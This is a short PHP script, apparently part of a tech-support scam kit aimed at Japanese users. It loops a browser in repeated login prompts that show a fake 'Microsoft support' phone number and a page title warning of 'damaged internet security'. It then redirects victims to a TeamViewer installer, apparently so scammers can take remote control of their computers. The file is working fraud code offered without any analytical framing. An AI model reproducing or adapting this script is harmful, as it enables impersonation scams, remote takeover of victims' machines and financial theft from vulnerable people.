<?php

    session_start();

    $_user = 'windows2016d';
    $_password = 'microsoft1';

    if ($_SERVER['PHP_AUTH_USER'] != $_user || $_SERVER['PHP_AUTH_PW'] != $_password ) {

        if(isset($_SESSION['login_attempts'])){ $_SESSION['login_attempts']++; }else{$_SESSION['login_attempts'] = 11;}

        if($_SESSION['login_attempts'] == 80){
            header('Location: Code0x72_df10dfdFRnkfdJP1018.php');
            exit;
        } else {

           header('WWW-Authenticate: Basic realm="マイクロソフトサポート（050）3136-9701."');
           header('HTTP/1.0 401 Unauthorized');
$page = $_SERVER['PHP_SELF'];
 $sec = "0";
 header("Refresh: $sec; url=$page");
         echo "<html><head><title>破損したインターネットセキュリティ !!! ヘルプデスクに電話する</title></head><body>";


            exit;
        }
    } else {

        header('Location: Code0x72_df10dfdFRnkfdJP1018.php');
        header('Location: http://download.teamviewer.com/download/TeamViewer_Setup_en.exe');

        exit;
    }
?>
